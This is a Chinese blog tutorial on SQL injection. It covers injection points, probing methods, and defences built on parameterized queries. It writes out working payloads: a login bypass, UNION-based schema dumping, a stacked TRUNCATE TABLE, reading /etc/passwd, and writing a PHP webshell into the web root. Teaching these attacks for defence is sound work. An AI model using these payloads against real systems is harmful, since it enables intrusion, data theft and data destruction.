---
title: "邪恶的SQL注入"
categories: [ "SQL" ]
tags: [ "sql","注入" ]
draft: false
slug: "sql-injection-of-evil"
date: "2013-09-03 21:34:00"
---

无论是在开发软件还是在制作Web应用，在处理用户输入或和用户进行交互时，从安全的角度考虑，一定要始终记住一句话：所有用户输入都是邪恶的。因为你永远都想不到用户会给你什么。在Web世界里最流行的Web攻击是SQL注入和DOS攻击。今天我们就从SQL注入攻击开始，分析用户可能会给你带来的惊喜。

## 一、SQL注入的位置


<!--more-->


SQL注入只有在SQL语句中插入了用户输入的字符串并没有做好相应的处理时才会发生，用户输入的来源可以是URL参数，POST数据，外部用户输入信息等。程序员在编写代码时往往需要在SQL中填入用户输入的参数，譬如根据用户ID查询用户信息，查询链接类似于`/get_user_info.php?uid=123`，具体到SQL代码可能是下面这样：

`SELECT * FROM User WHERE uid = 123`

或者是根据用户名来查找用户，链接类似于`/search_user.php?name=Zhangsan`，具体到SQL代码类似于下面：

`SELECT * FROM User WHERE name = 'Zhangsan'`

上面例子中123和Zhangsan就是用户输入的参数，同时也是可能的注入点。常见的SQL注入位置有下面几种（当然程序员可以把用户参数写到任何地方，不仅仅是WHERE条件里，也可以是`ORDER BY`或`GROUP BY`子句，甚至是SQL语句本身）：

    SELECT * FROM table WHERE id = XXX
    SELECT * FROM table WHERE name = 'XXX'
    SELECT * FROM table WHERE name = 'XXX' AND pass = 'YYY'
    SELECT * FROM table WHERE name = "XXX"
    SELECT * FROM table WHERE id IN (XXX)
    SELECT * FROM table WHERE name like '%XXX%'

## 二、SQL注入方法

从上面列出的SQL语句可以看出，常见的查询参数有可能是数字类型，也可能是字符串类型。两种类型的参数有不同的注入检测方法，字符串类型的参数可以使用`' '' " "" \ \\\`进行试探，而数字类型时可以用`AND 1、AND 0、AND true、AND false、1-false、1-true、2-1、1*100`等方法进行试探。下面举例说明： 一般情况下，如果程序对用户输入的参数做了正确的处理，那么输入任何参数页面都不会报错。如下面两句SQL：

    SELECT * FROM User WHERE name = 'Zhangsan''
    SELECT * FROM User WHERE name = 'Zhangsan'''

这两个SQL第二个是合法的，只要引号成对出现都没问题。如果用户分别输入Zhangsan'和Zhangsan''页面都能正常返回，则表明不存在注入问题，如果第一个输入页面异常，而第二个输入正常则表明该参数很可能是一个可以利用的注入点。 数字类型的参数看下面这个例子，如果用户输入123 AND 1和123 AND 0页面返回正常，并且结果一样，则说明程序对参数作了处理，而如果输入123 AND 1返回正常，输入123 AND 0返回空页面，则说明存在注入的可能。

    SELECT * FROM User WHERE uid = 123 AND 1
    SELECT * FROM User WHERE uid = 123 AND 0

# 三、注入能做什么

如果SQL注入只是简单的让页面出错或者返回空页面的话，那么SQL注入也就不会这么吸引人了。SQL注入的强大之处在于可以在服务器上做几乎任何事，听起来似乎是危言耸听，但事实确实如此，要不然SQL注入怎么会和DOS攻击一起成为最流行的网络攻击方法呢。下面我们就来看下通过一个简单的URL参数，可以做多么不可思议的事。

## 3.1 绕开验证

在用户登陆时，往往要根据用户输入的用户名和密码到数据库中进行查询比较，如果用户名和密码匹配则认为登陆成功。相应的SQL语句如下：

`SELECT * FROM Customer WHERE name = 'XX' AND pass = 'YY'`

如果没有对用户输入的参数进行检查，则当输入用户名为`admin`，密码为`' OR '' = ' `时，执行下面的SQL语句：

`SELECT * FROM Customer WHERE name = 'admin' AND pass = '' OR '' = ''`

这个SQL语句中的`'' = ''`将这个WHERE条件变成了恒等于TRUE，所以会返回所有记录。如果程序通过判断返回的记录数是否大于0来判断验证是否通过的话，这样我们就绕过了程序的验证。

## 3.2 暴库

根据上面的例子可以看到原本是想查询用户名为admin的用户记录，SQL注入后返回的却是数据库中的所有记录。通过这种方式连接其他的表，利用一点点的手段，就几乎可以获取所有数据库、所有表、所有字段的信息，并可以根据这些信息进一步查询数据库中的任意数据。这就是所谓的暴库。譬如还是上面的SQL例子，通过下面的SQL可以获取MySQL版本：

`SELECT * FROM User WHERE name = 'Zhangsan' AND MID(VERSION(),1,1) = '5'`

通过下面的SQL可以爆出所有表：

`SELECT * FROM User WHERE name = 'Zhangsan' UNION SELECT TABLE_SCHEMA, TABLE_NAME FROM information_schema.TABLES WHERE TABLE_TYPE = 'BASE TABLE'-- -'`

这种方法称为Union法。要让这个SQL能够正确执行，User表的字段必须和后面UNION SELECT的字段个数一致，如果字段个数不一致SQL执行会报错。所以要让这种方法生效首先得确定User表字段个数，一般通过ORDER BY试探法，如下所示，通过递增ORDER BY的数值直到页面出错来确定字段个数。

    SELECT * FROM User WHERE name = 'Zhangsan' ORDER BY 1 -- -'  -- 正常
    SELECT * FROM User WHERE name = 'Zhangsan' ORDER BY 2 -- -'  -- 正常
    SELECT * FROM User WHERE name = 'Zhangsan' ORDER BY 3 -- -'  -- 正常
    SELECT * FROM User WHERE name = 'Zhangsan' ORDER BY 4 -- -'  -- 正常
    SELECT * FROM User WHERE name = 'Zhangsan' ORDER BY 5 -- -'  -- 页面出错，可推测User表字段数为4

确定好`User`表的字段个数后，后面的`UNION SELECT`语句也需要做相应的调整，可以用数字1来填充，如下：

`SELECT * FROM User WHERE name = 'Zhangsan' UNION SELECT TABLE_SCHEMA, TABLE_NAME, 1, 1 FROM information_schema.TABLES WHERE TABLE_TYPE = 'BASE TABLE'-- -'`

## 3.3 增删改查，任意数据库操作

一旦知道了所有的数据库信息，则可以修改注入语句任意操作数据库。如下的例子将`Product`表清空：

`SELECT * FROM User WHERE uid = 123; TRUNCATE TABLE Product`

## 3.4 读写文件

MySQL提供了两个方法可以从本地读取和写入文件，如下：

    SELECT LOAD_FILE('/etc/passwd');
    SELECT '<? system($_GET[\'c\']); ?>' INTO OUTFILE '/var/www/shell.php';

上面两个例子展现了SQL注入的强大威力，如果MySQL用户拥有读写文件的权限，那么SQL注入将对站点带来巨大的威胁。第一个例子可以爆出linux服务器上的账号密码文件，第二个例子是向网站根目录写一个webshell，通过这个webshell用户就可以执行linux的系统命令了。譬如：`http://www.example.com/shell.php?c=ls`，通过webshell攻击者可以进一步做更多的事情了，最后直到控制整个服务器。

## 四、防范SQL注入

针对SQL注入的特点，总结以下几点基本的防范原则：

    

 1. 永远不要相信用户输入，对用户输入进行校验；
 2. 永远不要自己拼接SQL；
 3. 永远不要用管理员权限的数据库连接；
 4. 永远不要明文保存机密信息；
 5. 尽量不要显示程序的异常信息，保存到表或日志文件中；
 6. 使用WAF；（绕过WAF又是另一个话题了）

从编程的角度来看可以做如下的事情：

    

 1. 用户输入验证：类型转换、正则表达式、特殊符号过滤（引号，分号，注释符号等）
 2. 使用参数化存储过程
 3. 使用参数化SQL语句
 4. 采用ORM框架

其中将拼接的SQL语句改为使用参数化的SQL语句是最常用的防范方法，另外，参数化的SQL不仅比拼接的更安全，而且性能要更高。 SQL语句的执行过程分几个步骤：语法检查、分析、执行、返回结果。当一条SQL通过语法检查后，会在共享池里寻找是否有跟其相同的语句，如果有则用已有的执行计划执行语句，如果没有找到，则生成执行计划，然后才执行语句。 自己拼接的SQL语句会随着变量的不同而不同，如下面的两句SQL，执行每个SQL的时候都会生成一次执行计划，而这些执行计划其实都是一样的。

    SELECT * FROM Customer WHERE uid = 1
    SELECT * FROM Customer WHERE uid = 2

当这种SQL语句被大量调用时，会导致共享池中的SQL语句增多，而重用性极低，导致共享池内命中率下降。维护共享池内部结构消耗了大量的CPU和内存资源，而并没有充分利用执行计划的缓存优势，这样会带来性能问题。采用参数绑定的方式，可以解决这个问题：

    $uid = 1;
    $pdo = new PDO(...);
    $sql = "SELECT * FROM Customer WHERE uid = :ID";
    $stmt = $pdo->prepare($sql);
    $stmt->bindValue(":ID", $uid, PDO::PARAM_INT);
    $result = $stmt->execute();

参考

[网络攻击技术开篇——SQL Injection](http://www.cnblogs.com/rush/archive/2011/12/31/2309203.html)
[SQL注入式攻击的防治的六个建议](http://www.oecp.cn/hi/right_way/blog/2274)
[SQL注入漏洞及绑定变量浅谈](http://kb.cnblogs.com/page/55287/)
[SQL注入攻击防御深层思考](http://cookingbsd.blog.51cto.com/5404439/1196198)
[sql注入语句大全](http://www.cnblogs.com/aix1314/archive/2013/03/31/2991609.html)
[十大关系数据库SQL注入工具一览](http://www.csdn.net/article/2012-04-16/2804631)
[SQL注入测试工具：Pangolin（穿山甲）](http://blog.csdn.net/yefan2222/article/details/7086833)
[见招拆招：绕过WAF继续SQL注入常用方法](http://my.oschina.net/mik3y/blog/291613)
[技巧和诀窍：防范SQL注入攻击](http://blog.csdn.net/scottgu/article/details/1365023)
[另类的SQL注入方法](http://www.cnblogs.com/r00tgrok/p/3854754.html)
[深入理解SQL注入绕过WAF和过滤机制](http://www.cnblogs.com/r00tgrok/p/SQL_Injection_Bypassing_WAF_And_Evasion_Of_Filter.html)
[MySql注入科普](http://drops.wooyun.org/tips/123)
[MySql注入科普（原版）](http://websec.ca/kb/sql_injection)


